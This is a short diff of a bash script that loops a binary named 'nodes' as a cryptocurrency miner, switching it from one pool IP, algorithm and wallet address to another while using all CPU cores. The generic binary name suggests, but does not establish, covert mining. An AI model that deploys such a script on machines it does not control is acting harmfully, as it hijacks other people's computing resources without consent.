@@ -1,6 +1,6 @@
 #!/bin/bash
 while [ 1 ]; do 
-./nodes -a minotaurx -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo MINO-$(TZ=UTC-7 date +"%H-%M-%S")) -o 47.88.32.232:8080 -t $(nproc --all)
+./nodes -a Yespower -o 47.254.125.141:6666  -u v4rU16nhcJt4T9EPJ3xqjDpnCrsLKWAVrC.A1 -p x -t $(nproc --all)
 sleep 3
 done 
 sleep 999
